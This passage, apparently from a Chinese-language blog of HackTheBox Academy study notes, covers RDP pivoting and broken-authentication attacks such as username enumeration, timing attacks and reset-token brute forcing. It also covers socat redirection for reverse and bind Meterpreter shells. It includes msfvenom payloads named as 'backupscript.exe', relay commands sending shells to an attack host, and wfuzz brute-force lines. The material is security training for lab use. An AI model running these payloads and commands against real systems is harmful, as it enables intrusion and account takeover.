然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p><h4 id="Loading-SocksOverRDP-dll-using-regsvr32-exe"><a href="#Loading-SocksOverRDP-dll-using-regsvr32-exe" class="headerlink" title="Loading SocksOverRDP.dll using regsvr32.exe"></a>Loading SocksOverRDP.dll using regsvr32.exe</h4><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll</code></pre><p>现在，我们可以使用mstsc.exe通过RDP连接到172.16.5.19，我们应该会收到一个提示，即SocksOverRDP插件已启用，它将在127.0.0.1:1080上侦听。我们可以使用胜利者的凭据：pass@123连接到172.16.5.19。</p><p>我们需要将SocksOverRDP64.zip或仅将SocksOverRDP-Server.exe传输到172.16.5.19。然后，我们可以使用管理员权限启动SocksOverRDP-Server.exe。</p><p>当我们回到我们的立足点目标并查看Netstat时，我们应该会看到我们的SOCKS侦听器在127.0.0.1:1080。</p><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; netstat -antb | findstr 1080  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING</code></pre><p>启动我们的侦听器后，我们可以将Proxizer便携式传输到Windows 10目标（在10.129.x.x网络上），并将其配置为将我们的所有数据包转发到127.0.0.1:1080。Proxifier将通过给定的主机和端口路由流量。有关配置Proxifier的快速演练，请参阅下面的片段。</p><h4 id="Configuring-Proxifier"><a href="#Configuring-Proxifier" class="headerlink" title="Configuring Proxifier"></a>Configuring Proxifier</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041754536.gif" alt="img"></p><p>配置并运行Proxizer后，我们可以启动mstsc.exe，它将使用Proxizer通过127.0.0.1:1080将我们的所有流量进行枢轴传输，这将通过RDP将其传输到172.16.5.19，然后通过SocksOverRDP-server.exe将其路由到172.16.6.155。</p><h4 id="RDP-Performance-Considerations"><a href="#RDP-Performance-Considerations" class="headerlink" title="RDP Performance Considerations"></a>RDP Performance Considerations</h4><p>当在约定中与RDP会话交互时，我们可能会发现自己在给定会话中遇到性能缓慢的问题，尤其是当我们同时管理多个RDP会话时。如果是这种情况，我们可以访问mstsc.exe中的“体验”选项卡，并将“性能”设置为“调制解调器”。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041755688.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Broken Authentication</title>
      <link href="/2023/09/01/Broken-Authentication/"/>
      <url>/2023/09/01/Broken-Authentication/</url>
      
        <content type="html"><![CDATA[<h1 id="Overview-of-Attacks-Against-Authentication"><a href="#Overview-of-Attacks-Against-Authentication" class="headerlink" title="Overview of Attacks Against Authentication"></a>Overview of Attacks Against Authentication</h1><p>身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： <strong>HAS域（拥有的东西）</strong> <strong>IS域（所知信息）</strong> <strong>KNOWS域（所知的事情）</strong></p><span id="more"></span><h2 id="Attacking-the-HAS-Domain"><a href="#Attacking-the-HAS-Domain" class="headerlink" title="Attacking the HAS Domain"></a>Attacking the HAS Domain</h2><p>谈到在涵盖Multi-Factor Authentication时描述的三个域，has域看起来很简单，因为我们要么拥有硬件令牌，要么没有。然而，事情比表面上看起来更复杂： 徽章可以在不被接管的情况下被克隆 用于生成一次性密码的加密算法可能会被破坏 任何物理设备都可能被盗 远程天线可以轻松实现50厘米的工作距离，并复制经典的NFC徽章。你可能认为攻击者必须非常靠近受害者才能成功地执行这样的攻击。想想在使用公共交通工具或在商店排队等候时，我们坐得有多近，你可能会改变主意。每天都有多个人可以进行这样的克隆攻击。 想象一下，你正在办公室附近的酒吧吃快餐。你甚至没有注意到有袭击者从你的座位旁走过，因为你正忙于一项紧急的工作任务。他们刚刚克隆了你口袋里的徽章！！！几分钟后，他们将您的徽章信息转移到一个干净的代币中，并在吃午饭时使用它进入您公司的大楼。 很明显，克隆企业徽章并没有那么困难，而且后果可能很严重。</p><h2 id="Attacking-the-IS-Domain"><a href="#Attacking-the-IS-Domain" class="headerlink" title="Attacking the IS Domain"></a>Attacking the IS Domain</h2><p>你可能会认为is域是最难攻击的。如果一个人依靠“某物”来证明自己的身份，而这个“某物”被破坏了，他们就会失去证明自己身份的独特方式，因为没有人可以改变他们的身份。视网膜扫描、指纹读取器、面部识别都被证明是可以破解的。所有这些都可以通过第三方泄露、高清图片、吝啬鬼，甚至是偷对玻璃的邪恶女仆来破解。 销售基于is域的安全措施的公司表示，它们非常安全。2019年8月，一家制造通过移动或网络应用程序管理的生物识别智能锁的公司被攻破。该公司使用指纹或面部识别来识别授权用户。该漏洞暴露了所有指纹和面部模式，包括用户名和密码、授权和注册用户的地址。虽然用户可以轻松更改密码并减轻问题，但任何能够复制指纹或面部图案的人仍然可以解锁和管理这些智能锁。</p><h2 id="Attacking-the-KNOWS-Domain"><a href="#Attacking-the-KNOWS-Domain" class="headerlink" title="Attacking the KNOWS Domain"></a>Attacking the KNOWS Domain</h2><p>knows领域是我们将在本模块中深入研究的领域。这是最简单的理解，但我们应该深入了解每一个方面，因为它也是最广泛的。这个域指的是用户知道的东西，比如用户名或密码。在本模块中，我们将仅针对FBA进行工作。请记住，同样的方法也可以适用于HTTP身份验证实现。</p><h1 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h1><p> <a href="https://www.cirt.net/passwords">web database</a></p><h1 id="Weak-Bruteforce-Protections"><a href="#Weak-Bruteforce-Protections" class="headerlink" title="Weak Bruteforce Protections"></a>Weak Bruteforce Protections</h1><p>在深入研究攻击之前，我们必须了解在测试过程中可能遇到的保护措施。如今，有许多不同的安全机制旨在防止自动攻击。最常见的有以下几种。</p><ul><li><code>CAPTCHA</code></li><li><code>Rate Limits</code></li></ul><p> 此外，web开发人员经常创建自己的安全机制，使测试过程对我们来说更“有趣”，因为这些自定义安全机制可能包含我们可以利用的漏洞。让我们首先熟悉针对自动攻击的常见安全机制，以了解它们的功能，并为针对它们的攻击做好准备。</p><h2 id="CAPTCHA"><a href="#CAPTCHA" class="headerlink" title="CAPTCHA"></a>CAPTCHA</h2><p><a href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTCHA</a></p><p>一种广泛使用的安全措施，以“告诉计算机和人类分开的全自动公共图灵测试”这句话命名，可以有很多不同的形式。例如，它可能需要键入图像上的单词，听到一个简短的音频样本并将你听到的内容输入到表格中，将图像与给定的模式匹配，或者执行基本的数学运算。</p><p>尽管CAPTCHA在过去已经被成功绕过，但它对自动攻击仍然非常有效。应用程序至少应该要求用户在几次尝试失败后解决CAPTCHA问题。一些开发人员经常完全跳过这种保护，而另一些开发人员则更喜欢在登录失败后提供CAPTCHA，以保持良好的用户体验。 开发人员也可以使用CAPTCHA的自定义或弱实现，例如，图像的名称由图像中包含的字符组成。保护不力往往比没有保护更糟糕，因为它提供了一种虚假的安全感。下图显示了一个弱实现，PHP代码将图像的内容放入id字段。这种类型的弱实现是罕见的，但并非不可能。</p><p><img src="https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png" alt="img"></p><p>作为攻击者，我们只需读取页面的源代码即可找到CAPTCHA代码的值并绕过保护。我们应该始终阅读源代码。 作为开发人员，我们不应该开发自己的CAPTCHA，而应该依赖一个经过良好测试的CAPTCHA，并在很少失败登录后需要它。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><h2 id="Insufficient-Protections"><a href="#Insufficient-Protections" class="headerlink" title="Insufficient Protections"></a>Insufficient Protections</h2><p>当攻击者可以篡改为提高安全性而考虑的数据时，他们可以绕过所有或部分保护。例如，更改用户代理标头很容易。一些web应用程序或web应用程序防火墙利用X-Forwarded-For等标头来猜测实际的源IP地址。这样做是因为许多互联网提供商、移动运营商或大公司通常将用户“隐藏”在NAT后面。在没有X-Forwarded-For等标头帮助的情况下阻止IP地址可能会导致阻止特定NAT后面的所有用户。</p><h1 id="Brute-Forcing-Usernames"><a href="#Brute-Forcing-Usernames" class="headerlink" title="Brute Forcing Usernames"></a>Brute Forcing Usernames</h1><p>用户名枚举经常被忽视，可能是因为人们认为用户名不是私人信息。当你给另一个用户写消息时，我们通常认为我们知道他们的用户名、电子邮件地址等。同一个用户名经常被重复用于访问其他服务，如FTP、RDP和SSH等。由于许多web应用程序允许我们识别用户名，我们应该利用这一功能，并将其用于以后的攻击。</p><p>广泛的web应用程序都存在此漏洞。 用户名通常远没有密码复杂。当它们不是电子邮件地址时，很少包含特殊字符。拥有一个常见用户列表会给攻击者带来一些优势。除了获得良好的用户体验（UX）外，遇到随机或不易预测的用户名也很少见。用户将比计算机生成的（伪）随机用户名更容易记住他们的电子邮件地址或昵称。 拥有有效用户名列表，攻击者可以缩小暴力攻击的范围，或对支持员工或用户本身进行有针对性的攻击（利用OSINT）。此外，一个通用密码可以很容易地被喷到有效的帐户上，通常会导致成功的帐户泄露。 应该注意的是，用户名也可以通过抓取网络应用程序或使用公共信息来获取，例如社交网络上的公司简介。 防止用户名枚举攻击可能会影响用户体验。网络应用程序显示用户名是否存在可能有助于合法用户识别他们未能正确键入用户名，但这同样适用于试图确定有效用户名的攻击者。即使是像WordPress这样知名且成熟的web框架，也会受到用户枚举的影响，因为开发团队选择通过降低框架的安全级别来获得更流畅的用户体验。</p><h2 id="User-Unknown-Attack"><a href="#User-Unknown-Attack" class="headerlink" title="User Unknown Attack"></a>User Unknown Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d &quot;Username=FUZZ&amp;Password=dummypass&quot; --hs &quot;Unknown username&quot; http://brokenauthentication.hackthebox.eu/user_unknown.php</code></pre><h2 id="Username-Existence-Inference"><a href="#Username-Existence-Inference" class="headerlink" title="Username Existence Inference"></a>Username Existence Inference</h2><p>有时，web应用程序可能不会明确声明它不知道特定的用户名，但允许攻击者推断这条信息。如果用户名有效且已知，则某些web应用程序会预先填充用户名输入值，但如果用户名未知，则保留输入值为空或使用默认值。这在移动版本的网站上很常见，我们之前看到的易受攻击的WordPress登录页面也是如此。在开发过程中，始终尝试为失败登录和授权登录提供相同的体验：即使是微小的差异也足以推断出一条信息。</p><p>虽然不常见，但当用户名有效或无效时，也可能设置不同的cookie。例如，要使用客户端控件检查密码尝试，web应用程序可以设置一个名为“failed_login”的cookie，然后仅在用户名有效时检查该cookie。仔细检查响应，注意HTTP头和HTML源代码中的差异。</p><h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2><p>某些身份验证功能在设计上可能存在缺陷。一个示例是身份验证函数，其中按顺序检查用户名和密码。让我们分析一下下面的程序。</p><pre><code class="php">&lt;?php// connect to database$db = mysqli_connect(&quot;localhost&quot;, &quot;dbuser&quot;, &quot;dbpass&quot;, &quot;dbname&quot;);// retrieve row data for user$result = $db-&gt;query(&#39;SELECT * FROM users WHERE username=&quot;&#39;.safesql($_POST[&#39;user&#39;]).&#39;&quot; AND active=1&#39;);// $db-&gt;query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)if ($result) &#123;  // retrieve a row. don&#39;t use this code if multiple rows are expected  $row = mysqli_fetch_row($result);  // hash password using custom algorithm  $cpass = hash_password($_POST[&#39;password&#39;]);    // check if received password matches with one stored in the database  if ($cpass === $row[&#39;cpassword&#39;]) &#123;    echo &quot;Welcome $row[&#39;username&#39;]&quot;;  &#125; else &#123;    echo &quot;Invalid credentials.&quot;;  &#125; &#125; else &#123;  echo &quot;Invalid credentials.&quot;;&#125;?&gt;</code></pre><p>代码片段首先连接到数据库，然后执行查询以检索用户名与请求的用户名匹配的整行。如果没有结果，函数将以一条通用消息结束。当$result为true（用户存在并且处于活动状态）时，将对提供的密码进行散列和比较。如果使用的哈希算法足够强大，那么两个分支之间的时序差异将是显而易见的。通过使用通用hash_password（）函数计算$cpass，&#x3D;&#x3D;响应时间将高于其他情况&#x3D;&#x3D;。这个小错误可以通过在同一步骤中检查用户和密码来避免，有效用户名和无效用户名的时间相似。 下载脚本 <a href="https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt">timing.py</a>来见证这些类型的时间差异，并针对使用bcrypt的示例web应用程序（timing.php）运行它。</p><h4 id="Timing-Attack-Timing-py"><a href="#Timing-Attack-Timing-py" class="headerlink" title="Timing Attack - Timing.py"></a>Timing Attack - Timing.py</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt</code></pre><p>考虑到可能存在网络故障，很容易将“admin”识别为有效用户，因为它比其他测试用户花费了更多的时间。如果使用的算法很快，则时差会更小，攻击者可能会因为网络延迟或CPU负载而产生误报。然而，通过重复大量创建模型的请求，攻击仍然是可能的。虽然我们可以假设现代应用程序使用稳健的算法对密码进行散列，以使潜在的离线暴力攻击尽可能慢，但即使使用MD5或SHA1等快速算法，也可以推断信息。 当领英的用户群在2012年被泄露时，InfoSec的专业人士就SHA1被用作用户密码的哈希算法展开了一场辩论。虽然SHA1在那些日子里没有崩溃，但它被认为是一个不安全的哈希解决方案。Infosec的专业人士开始争论是否选择使用SHA1，而不是更强大的哈希算法，如scrypt、bcrypt或PBKDF（或argon2）。 虽然使用更健壮的算法总是比使用较弱的算法更可取，但架构工程师也应该记住计算成本。这个非常基本的Python脚本有助于阐明这个问题：</p><pre><code class="python">import scryptimport bcryptimport datetimeimport hashlibrounds = 100salt = bcrypt.gensalt()t0 = datetime.datetime.now()for x in range(rounds):    scrypt.hash(str(x).encode(), salt)t1 = datetime.datetime.now()for x in range(rounds):    hashlib.sha1(str(x).encode())t2 = datetime.datetime.now()for x in range(rounds):    bcrypt.hashpw(str(x).encode(), salt)t3 = datetime.datetime.now()print(&quot;sha1:   &#123;&#125;\nscrypt: &#123;&#125;\nbcrypt: &#123;&#125;&quot;.format(t2-t1,t1-t0,t3-t2))</code></pre><p>使用更稳健的算法，这会增加CPU时间和RAM使用量。core第八代i5上运行上面的脚本会得到以下结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 hashtime.pysha1:   0:00:00.000082scrypt: 0:00:03.907575bcrypt: 0:00:22.660548</code></pre><p>让我们通过一个粗略的例子来添加一些上下文： 领英每天有约2亿用户，这意味着每秒约有24次登录（我们不排除拥有“记住我”代币的用户）。 如果他们使用像bcrypt这样的强大算法，在我们的测试机器上每轮使用0.23秒，他们将需要六台服务器才能让人们登录。对于一家运行数千台服务器的公司来说，这听起来不是什么大问题，但这需要对架构进行彻底改革。</p><h2 id="Enumerate-through-Password-Reset"><a href="#Enumerate-through-Password-Reset" class="headerlink" title="Enumerate through Password Reset"></a>Enumerate through Password Reset</h2><p>重置表单的保护通常不如登录表单好。因此，他们经常泄露有关有效或无效用户名的信息。正如我们已经讨论过的，当找到有效的用户名时，应用程序会回复“您应该很快收到一条消息”，而“用户名未知，请检查您的数据”则会泄露注册用户的存在。 这种攻击很吵，因为一些有效用户可能会收到要求重置密码的电子邮件。也就是说，这些电子邮件经常得不到最终用户的适当关注。</p><h2 id="Enumerate-through-Registration-Form"><a href="#Enumerate-through-Registration-Form" class="headerlink" title="Enumerate through Registration Form"></a>Enumerate through Registration Form</h2><p>默认情况下，当所选用户名已经存在时，提示用户选择用户名的注册表单通常会回复一条明确的消息，或者在这种情况下提供其他“告诉”。通过滥用这种行为，攻击者可以注册常见的用户名，如admin、administrator、tech，以枚举有效的用户名。在检查所选用户名（如CAPTCHA）是否存在之前，安全注册表应该实现一些保护。 在测试时，许多人不知道或没有准备好电子邮件地址的一个有趣功能是子寻址。这个在RFC5233中定义的扩展表示，邮件传输代理（MTA）应该忽略电子邮件地址左侧的任何+标记，并将其用作筛选过滤器的标记。这意味着写信给学生这样的电子邮件地址<a href="mailto:&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;">&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;</a>将电子邮件发送到<a href="mailto:&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;">&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;</a>并且，如果支持并正确配置了过滤器，则会将其放置在文件夹htb中。很少有网络应用程序尊重这个RFC，这导致了通过使用一个标签和一个实际的电子邮件地址来注册几乎无限用户的可能性。</p><h2 id="Predictable-Usernames"><a href="#Predictable-Usernames" class="headerlink" title="Predictable Usernames"></a>Predictable Usernames</h2><p>在用户体验需求较少的网络应用程序中，例如家庭银行，或者需要批量创建多个用户时，我们可能会看到按顺序创建的用户名。 虽然不常见，但您可能会遇到像user1000、user1001这样的帐户。“管理”用户也可能有一个可预测的命名约定，如support.It、support.fr或类似的。攻击者可以推断用于创建用户的算法（增量四位数、国家代码等），并从一些已知的用户帐户开始猜测现有用户帐户。</p><h1 id="Brute-Forcing-Passwords"><a href="#Brute-Forcing-Passwords" class="headerlink" title="Brute Forcing Passwords"></a>Brute Forcing Passwords</h1><h2 id="Password-Issues"><a href="#Password-Issues" class="headerlink" title="Password Issues"></a>Password Issues</h2><p>从历史上看，密码有三个重要问题。第一个问题在于名称本身。很多时候，用户认为密码可以只是一个单词，而不是一个短语。第二个问题是，用户大多设置了易于记住的密码。这样的密码通常很弱，或者遵循可预测的模式。即使用户选择了一个更复杂的密码，它通常也会写在便利贴上或保存在明文中。在提示字段中写入密码的情况也并不少见。当访问企业网络的频繁密码轮换要求开始发挥作用时，第二个密码问题会变得更糟。这一要求通常会导致诸如Spring2020、Autumn2020或CompanynameTown1、CompanynameTown2等密码。 最近，美国国家标准与技术研究院更新了其关于密码策略测试、密码年龄要求和密码组成规则的指导方针。</p><p>最后，众所周知，许多用户在多个服务上重复使用相同的密码。其中一个密码泄露或泄露会让攻击者访问广泛的网站或应用程序。这种攻击被称为凭据填充，与Hashcat破解密码模块中教授的单词列表生成密切相关。存储和使用复杂密码的可行解决方案是密码管理器。有时您可能会遇到弱密码要求。这种情况通常发生在有额外安全措施的情况下。ATM就是一个很好的例子。密码，或者更好的是PIN，只是一个4或5位数字的序列。相当弱，但缺乏复杂性，但总尝试次数有限（在失去对设备的物理访问之前，不超过3个PIN）。</p><p>现在让我们假设这个web应用程序需要一个介于8到12个字符之间的字符串，其中至少有一个大写和小写字符。我们现在使用一个巨大的单词列表，只提取符合此策略的密码。Unix grep不是速度最快的工具，但它允许我们使用POSIX正则表达式快速完成这项工作。下面的命令将针对rockyou-50.txt，这是SecLists中常见的rockyou密码泄漏的子集。此命令使用扩展正则表达式（-E）查找至少有一个大写字符（“[：upper：]]”）的行，然后仅查找同时有一个小写字符（“[[：lower：]]’”）并且长度为8和12个字符（“^.｛8,12｝$”）的线。</p><pre><code class="shell-session">Tanin@htb[/htb]$ grep &#39;[[:upper:]]&#39; rockyou.txt | grep &#39;[[:lower:]]&#39; | grep -E &#39;^.&#123;8,12&#125;$&#39;</code></pre><h1 id="Predictable-Reset-Token"><a href="#Predictable-Reset-Token" class="headerlink" title="Predictable Reset Token"></a>Predictable Reset Token</h1><p>重置令牌（以代码或临时密码的形式）是主要由应用程序在请求重置密码时生成的秘密数据。在实际更改凭据之前，用户必须提供它来证明自己的身份。有时，应用程序要求您选择一个或多个安全问题，并在注册时提供答案。如果您忘记了密码，您可以通过再次回答这些问题来重置密码。我们也可以将这些答案视为象征。 此功能允许我们在不知道密码的情况下重置用户的实际密码。</p><h2 id="Reset-Token-by-Email"><a href="#Reset-Token-by-Email" class="headerlink" title="Reset Token by Email"></a>Reset Token by Email</h2><p>如果应用程序允许用户使用URL或通过电子邮件发送的临时密码重置密码，那么它应该包含强大的令牌生成功能。框架通常具有用于此目的的专用功能。然而，开发人员通常会实现自己的功能，这些功能可能会引入逻辑缺陷和弱加密，或者通过模糊实现安全性。</p><h2 id="Weak-Token-Generation"><a href="#Weak-Token-Generation" class="headerlink" title="Weak Token Generation"></a>Weak Token Generation</h2><p>一些应用程序使用已知或可预测的值（如本地时间或请求操作的用户名）创建令牌，然后对值进行散列或编码。这是一种糟糕的安全做法，因为令牌不需要包含来自要验证的实际用户的任何信息，并且应该是一个纯随机值。在可逆编码的情况下，对令牌进行解码以了解它是如何构建的并伪造一个有效的令牌就足够了。<br>作为渗透测试人员，我们应该意识到这些类型的糟糕实现。当为给定用户请求重置令牌时，我们应该尝试使用已知的组合（如时间+用户名或时间+电子邮件）来强制执行任何弱哈希。以这段PHP代码为例。它在逻辑上等同于Apache OpenMeeting上报告的CVE-2016-0783漏洞：</p><pre><code class="php">&lt;?phpfunction generate_reset_token($username) &#123;  $time = intval(microtime(true) * 1000);  $token = md5($username . $time);  return $token;&#125;</code></pre><p>很容易发现漏洞。知道有效用户名的攻击者可以通过读取Date标头（它几乎总是出现在HTTP响应中）来获取服务器时间。然后，攻击者可以在几秒钟内强行执行$time值，并获得有效的重置令牌。在这个例子中，我们可以看到一个常见的请求泄露日期和时间。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061018944.png" alt="img"></p><p>我们可以使用wfuzz。具体来说，我们可以为区分大小写的字符串Valid（–ss“Valid”）使用字符串匹配。当然，如果我们不知道提交有效令牌时web应用程序是如何回复的，我们可以使用“反向匹配”，通过使用–hs “Invalid.”查找不包含无效令牌的任何响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -z range,00000-99999 --ss &quot;Valid&quot; &quot;https://brokenauthentication.hackthebox.eu/token.php?user=admin&amp;token=FUZZ&quot;</code></pre><p>&lt;待续…&gt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp;Playing Pong with Socat</title>
      <link href="/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/"/>
      <url>/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/</url>
      
        <content type="html"><![CDATA[<h1 id="Socat-Redirection-with-a-Reverse-Shell"><a href="#Socat-Redirection-with-a-Reverse-Shell" class="headerlink" title="Socat Redirection with a Reverse Shell"></a>Socat Redirection with a Reverse Shell</h1><p><a href="https://linux.die.net/man/1/socat">Socat</a>是一个双向中继工具，可以在2个独立的网络通道之间创建管道套接字，而无需使用SSH隧道。它充当了一个重定向器，可以监听一个主机和端口，并将数据转发到另一个IP地址和端口。我们可以使用上一节中提到的攻击主机上的相同命令启动Metasploit的侦听器，我们也可以在Ubuntu服务器上启动socat。</p><h4 id="Starting-Socat-Listener"><a href="#Starting-Socat-Listener" class="headerlink" title="Starting Socat Listener"></a>Starting Socat Listener</h4><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></pre><p>Socat将在8080端口的localhost上侦听，并将所有流量转发到我们的攻击主机（10.10.14.18）上的80端口。一旦配置了我们的重定向器，我们就可以创建一个有效负载，该负载将连接回在Ubuntu服务器上运行的重定向器。我们还将在攻击主机上启动一个侦听器，因为一旦socat接收到来自目标的连接，它就会将所有流量重定向到攻击主机的侦听器，在那里我们将获得一个shell。</p><h4 id="Creating-the-Windows-Payload"><a href="#Creating-the-Windows-Payload" class="headerlink" title="Creating the Windows Payload"></a>Creating the Windows Payload</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 80lport =&gt; 80msf6 exploit(multi/handler) &gt; run</code></pre><h1 id="Socat-Redirection-with-a-Bind-Shell"><a href="#Socat-Redirection-with-a-Bind-Shell" class="headerlink" title="Socat Redirection with a Bind Shell"></a>Socat Redirection with a Bind Shell</h1><p>类似于我们的socat的反向shell重定向器，我们也可以创建一个socat绑定shell重定向器。这与从Windows服务器连接回Ubuntu服务器并重定向到我们的攻击主机的反向shell不同。在绑定shell的情况下，Windows服务器将启动一个侦听器并绑定到一个特定的端口。我们可以为Windows创建一个绑定shell负载，并在Windows主机上执行它。同时，我们可以在Ubuntu服务器上创建一个socat重定向器，它将侦听来自Metasploit绑定处理程序的传入连接，并将其转发到Windows目标上的绑定shell负载。下图应该可以更好地解释枢轴。</p><p><img src="https://academy.hackthebox.com/storage/modules/158/55.png" alt="img"></p><p>我们可以通过以下命令使用msfvenom创建绑定shell。</p><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 499 bytesFinal size of exe file: 7168 bytesSaved as: backupjob.exe</code></pre><p>我们可以启动一个socat绑定shell侦听器，它在端口8080上侦听并将数据包转发到Windows服务器8443。</p><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></pre><p>最后，我们可以启动一个Metasploit绑定处理程序。这个绑定处理程序可以配置为连接到端口8080（Ubuntu服务器）上的socat侦听器</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcppayload =&gt; windows/x64/meterpreter/bind_tcpmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64RHOST =&gt; 10.129.202.64msf6 exploit(multi/handler) &gt; set LPORT 8080LPORT =&gt; 8080msf6 exploit(multi/handler) &gt; run[*] Started bind TCP handler against 10.129.202.64:8080</code></pre><p>我们可以看到，在Windows目标上执行有效负载时，绑定处理程序通过socat侦听器连接到阶段请求。</p><pre><code class="shell-session">[*] Sending stage (200262 bytes) to 10.129.202.64[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500meterpreter &gt; getuidServer username: INLANEFREIGHT\victor</code></pre><h1 id="socat基本用法："><a href="#socat基本用法：" class="headerlink" title="socat基本用法："></a>socat基本用法：</h1><p><code>socat</code> 是一个非常灵活的工具，可以用于许多不同的用途。以下是一些常见的 <code>socat</code> 命令示例，演示了一些常见的用法：</p><ol><li><p><strong>创建端口转发：</strong></p><pre><code>socat TCP-LISTEN:8080,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8080，并将流量转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>创建代理服务器：</strong></p><pre><code>socat TCP-LISTEN:8888,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8888，将流量作为代理转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>加密连接：</strong></p><pre><code>socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork OPENSSL:目标IP:8443</code></pre><p>在本地监听端口 443，使用 SSL 加密，将数据转发到目标 IP 地址的 8443 端口。</p></li><li><p><strong>创建虚拟串口：</strong></p><pre><code>socat PTY,link=/dev/ttyS0 PTY,link=/dev/ttyS1</code></pre><p>创建两个虚拟串口设备 <code>/dev/ttyS0</code> 和 <code>/dev/ttyS1</code>，将数据从一个串口转发到另一个串口。</p></li><li><p><strong>文件传输：</strong></p><pre><code>socat FILE:source.txt TCP-LISTEN:8080</code></pre><p>将文件 <code>source.txt</code> 的内容通过 TCP 在本地监听端口 8080 上传输。</p></li><li><p><strong>执行 Shell 命令：</strong></p><pre><code>socat SYSTEM:&#39;ls -l&#39;,pty,stderr TCP-LISTEN:8080</code></pre><p>在本地监听端口 8080，执行 <code>ls -l</code> 命令并将输出传输到连接。</p></li></ol><p>这些示例只是 <code>socat</code> 的一小部分用法，它有很多其他功能和选项，可以根据不同的需求进行调整。在使用 <code>socat</code> 时，应该查阅官方文档以了解更多详细信息和用法示例。</p><h1 id="本节备忘录："><a href="#本节备忘录：" class="headerlink" title="本节备忘录："></a>本节备忘录：</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ifconfig</code></td><td>Linux-based command that displays all current network configurations of a system.</td></tr><tr><td><code>ipconfig</code></td><td>Windows-based command that displays all system network configurations.</td></tr><tr><td><code>netstat -r</code></td><td>Command used to display the routing table for all IPv4-based protocols.</td></tr><tr><td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td><td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH comand used to create an SSH tunnel from a local machine on local port 